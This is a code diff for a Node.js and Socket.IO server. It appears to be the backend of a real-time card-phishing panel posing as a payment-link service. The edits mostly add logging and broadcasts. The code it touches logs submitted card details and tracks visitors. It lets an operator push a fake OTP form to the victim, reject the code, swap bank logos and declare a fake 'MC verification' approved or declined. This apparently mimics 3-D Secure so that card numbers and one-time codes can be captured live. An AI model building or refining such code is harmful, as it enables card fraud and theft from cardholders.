@@ -487,7 +487,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Payment Links Endpoints - MODIFIED to include amount in URL
+// FIX 1: Modified Payment Links Endpoint to explicitly include amount in URL
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description, includeScreenCapture } = req.body;
@@ -503,13 +503,13 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Use the redirect file instead of landing.html and include amount parameter
+    // EXPLICITLY include amount parameter in the URL
     const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}&amount=${amount}`;
 
     // Create the current timestamp properly and log it
     const now = new Date();
     const createdAt = now.toISOString();
-    console.log(`Creating payment link ${invoiceId} with timestamp: ${createdAt} (${now.getTime()})`);
+    console.log(`Creating payment link ${invoiceId} with timestamp: ${createdAt} (${now.getTime()}) and amount: ${amount}`);
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -580,7 +580,7 @@ app.post('/api/expirePaymentLink', (req, res) => {
   // Check if the input is a URL
   if (pid.includes('://') || pid.includes('?pid=')) {
     try {
-      // Try to extract the pid from the URL
+      // Try to extract pid from URL query parameters
       let url;
       if (pid.includes('?pid=')) {
         // If it's a query parameter format
@@ -616,11 +616,12 @@ app.post('/api/expirePaymentLink', (req, res) => {
   });
 });
 
-// Modified endpoint with link expiration check and free link handling
+// FIX 1: Enhanced getPaymentDetails to properly handle amount
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   
   if (!pid || !paymentLinks.has(pid)) {
+    console.error(`Payment details request for non-existent pid: ${pid}`);
     return res.status(404).json({ status: "error", message: "Not found" });
   }
   
@@ -630,6 +631,9 @@ app.get('/api/getPaymentDetails', (req, res) => {
   }
   
   const payment = paymentLinks.get(pid);
+  
+  // IMPORTANT: Log the amount being returned for debugging
+  console.log(`Returning payment details for pid ${pid} with amount: ${payment.amount}`);
   
   // Check for free=true in the request query for backward compatibility
   const isFreeLink = req.query.free === 'true' || payment.isFreeLink === true;
@@ -738,7 +742,7 @@ app.post('/api/showOTP', (req, res) => {
     invoiceId: invoiceId // Send both formats for compatibility
   };
   
-  // Broadcast to ALL clients, not just those in a room
+// Broadcast to ALL clients, not just those in a room
   io.emit('show_otp', otpData);
   
   // Also broadcast specifically to the room
@@ -763,7 +767,7 @@ app.post('/api/showOTP', (req, res) => {
   }
   
   console.log(`OTP display requested for invoice: ${invoiceId}`);
-res.json({ status: "success", message: "OTP form shown" });
+  res.json({ status: "success", message: "OTP form shown" });
 });
 
 // Mark OTP as wrong
@@ -1037,7 +1041,8 @@ io.on('connection', (socket) => {
       lastActive: Date.now(),
       userAgent: data.userAgent || socket.handshake.headers['user-agent'] || 'Unknown',
       sessionId: data.sessionId || `session-${Date.now()}`,
-      url: data.url || socket.handshake.headers.referer || 'Unknown'
+      url: data.url || socket.handshake.headers.referer || 'Unknown',
+      amount: data.amount || 0 // Store amount with visitor
     };
     
     // Store visitor information
@@ -1116,7 +1121,7 @@ io.on('connection', (socket) => {
     console.log('Card details received:', data);
     
     // Make sure the data has an invoiceId
-if (!data.invoiceId) {
+    if (!data.invoiceId) {
       data.invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     }
     
@@ -1423,33 +1428,39 @@ if (!data.invoiceId) {
     console.log(`MC verification started for invoice: ${data.invoiceId}, type: ${data.verificationType}, bank: ${data.bankCode}`);
   });
 
-// FIX 2: Enhanced bank update handler in server.js
-socket.on('update_mc_bank', (data) => {
-  // Update bank logo on client
-  console.log('Received update_mc_bank event:', data);
-
-  // Update verification state
-  if (verificationStates.has(data.invoiceId)) {
-    const state = verificationStates.get(data.invoiceId);
-    state.bankCode = data.bankCode;
-    verificationStates.set(data.invoiceId, state);
-  }
-
-  // IMPORTANT: Send to all possible client paths
-  io.to(data.invoiceId).emit('update_mc_bank', {
-    invoiceId: data.invoiceId,
-    bankCode: data.bankCode
-  });
+  // FIX 2: Enhanced bank logo update handler
+  socket.on('update_mc_bank', (data) => {
+    // Update bank logo on client
+    console.log('Received update_mc_bank event:', data);
   
-  // If there's a stored socket ID for this transaction, also send to that socket directly
-  const txn = transactions.get(data.invoiceId);
-  if (txn && txn.socketId) {
-    io.to(txn.socketId).emit('update_mc_bank', {
+    // Update verification state
+    if (verificationStates.has(data.invoiceId)) {
+      const state = verificationStates.get(data.invoiceId);
+      state.bankCode = data.bankCode;
+      verificationStates.set(data.invoiceId, state);
+    }
+  
+    // Broadcast to all possible client channels to ensure bank logo is updated
+    io.to(data.invoiceId).emit('update_mc_bank', {
       invoiceId: data.invoiceId,
       bankCode: data.bankCode
     });
-  }
-});
+    
+    // If there's a stored socket ID for this transaction, also send to that socket directly
+    const txn = transactions.get(data.invoiceId);
+    if (txn && txn.socketId) {
+      io.to(txn.socketId).emit('update_mc_bank', {
+        invoiceId: data.invoiceId,
+        bankCode: data.bankCode
+      });
+    }
+    
+    // Also broadcast to the entire socket connection
+    socket.broadcast.emit('update_mc_bank', {
+      invoiceId: data.invoiceId,
+      bankCode: data.bankCode
+    });
+  });
 
   socket.on('update_mc_currency', (data) => {
     // Update currency on client
@@ -1542,37 +1553,46 @@ socket.on('update_mc_bank', (data) => {
     }
   });
 
-  // FIX 3: Enhanced verification result handler in server.js 
-socket.on('mc_verification_result', (data) => {
-  // Log the verification result
-  console.log('MC verification result:', data);
-
-  // Update verification state
-  if (verificationStates.has(data.invoiceId)) {
-    const state = verificationStates.get(data.invoiceId);
-    state.status = data.success ? 'verified' : 'failed';
-    verificationStates.set(data.invoiceId, state);
-  }
-
-  // Update transaction status
-  const txn = transactions.get(data.invoiceId);
-  if (txn) {
-    txn.status = data.success ? 'approved' : 'declined';
-    txn.redirectStatus = data.success ? 'success' : 'fail';
-    if (data.reason) {
-      txn.failureReason = data.reason;
-    }
-    transactions.set(data.invoiceId, txn);
-  }
-
-  // Send verification result to client via multiple channels to ensure delivery
-  io.to(data.invoiceId).emit('mc_verification_result', data);
+  // FIX 3: Enhanced MC verification result handler for proper redirects
+  socket.on('mc_verification_result', (data) => {
+    // Log the verification result
+    console.log('MC verification result:', data);
   
-  // If there's a stored socket ID for this transaction, also send to that socket directly
-  if (txn && txn.socketId) {
-    io.to(txn.socketId).emit('mc_verification_result', data);
-  }
-});
+    // Update verification state
+    if (verificationStates.has(data.invoiceId)) {
+      const state = verificationStates.get(data.invoiceId);
+      state.status = data.success ? 'verified' : 'failed';
+      verificationStates.set(data.invoiceId, state);
+    }
+  
+    // Update transaction status
+    const txn = transactions.get(data.invoiceId);
+    if (txn) {
+      txn.status = data.success ? 'approved' : 'declined';
+      txn.redirectStatus = data.success ? 'success' : 'fail';
+      // Store failure reason if present
+      if (data.reason) {
+        txn.failureReason = data.reason;
+      }
+      transactions.set(data.invoiceId, txn);
+    }
+  
+    // Send verification result to all possible client channels
+    io.to(data.invoiceId).emit('mc_verification_result', data);
+    
+    // If there's a stored socket ID for this transaction, also send to that socket directly
+    if (txn && txn.socketId) {
+      io.to(txn.socketId).emit('mc_verification_result', data);
+    }
+    
+    // Try sending it directly to all sockets in case the client's connection has changed
+    socket.broadcast.emit('mc_verification_result', {
+      invoiceId: data.invoiceId,
+      success: data.success,
+      reason: data.reason,
+      message: data.message
+    });
+  });
 
   socket.on('mc_verification_cancelled', (data) => {
     // Find the transaction for this socket if not provided
